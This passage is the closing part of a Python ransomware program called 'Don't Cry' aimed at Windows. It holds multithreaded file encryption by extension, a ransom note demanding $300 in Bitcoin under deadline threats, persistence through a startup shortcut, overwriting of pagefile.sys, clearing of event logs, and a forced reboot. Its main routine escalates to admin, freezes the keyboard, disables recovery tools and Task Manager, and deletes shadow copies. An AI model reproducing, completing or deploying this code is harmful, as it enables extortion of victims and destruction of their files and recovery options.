        ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"
    ]
    with ThreadPoolExecutor(max_workers=8) as executor:
        futures = []
        for root, _, files in os.walk(directory_path):
            for file in files:
                if not os.path.splitext(file)[1].lower() in files_targeted:
                    continue
                file_path = os.path.join(root, file)
                futures.append(executor.submit(encrypt_file, file_path, key))
        for future in futures:
            future.result()


def shutdown():
    msg = f"""==================================================
            Your files are encrypted!             
==================================================

Important!
All of your important files have been encrypted by Don't Cry ransomware.
To get them back, you need to follow the instructions below.

1. Do not try to recover your files by yourself!
- If you try to remove the encryption by yourself, your files will be permanently lost.

2. How to restore your files?
- You need to pay a ransom to get the decryption key.
- The amount of the ransom is $300 in Bitcoin.

3. Instructions for payment:
- Buy Bitcoin (BTC) and send $300 to the address: [Bitcoin Address Here]
- After the transaction is confirmed, send an email to [Email Address Here] with your id ({id}) and username.
- Then, you will then receive a decryption key to unlock your files.

4. Warning!
- If you don't pay within 72 hours, the price will double.
- If you don't pay within 7 days, all your files will no longer be decryptable!!!

Don't Cry =}"""
    file_path = os.path.join(os.environ["USERPROFILE"], r"Desktop\README.txt")
    with open(file_path, "w") as f:
        f.write(msg)
    startup = winshell.startup()
    shortcut_path = os.path.join(startup, "OpenFileAtStartup.lnk")
    shell = Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = "notepad.exe"
    shortcut.Arguments = file_path
    shortcut.save()
    file_path = os.path.join(os.getenv("SystemDrive"), "pagefile.sys")
    try:
        with open(file_path, "w") as f:
            f.write(os.urandom(os.path.getsize(file_path)))
        os.remove(file_path)
    except:
        pass
    clear_event_logs()
    execute_command("shutdown /r /f /t 2")
    disable_cmd()


def execute_command(command, shell=True):
    return subprocess.Popen(
        command, creationflags=subprocess.CREATE_NO_WINDOW, shell=shell
    ).wait()


def disable_all():
    disable_ram_dump()
    disable_regedit()
    disable_powershell()
    disable_recovery()
    disable_task_manager()


dev_mode = False
if __name__ == "__main__":
    if not dev_mode:
        if not check_connection():
            sys.exit(2)
        if not is_admin():
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit(0)
        freeze_keyboard()
        block_processes()
        disable_all()
        start_encryption()
        delete_shadow_copy()
        change_wallpaper()
        shutdown()
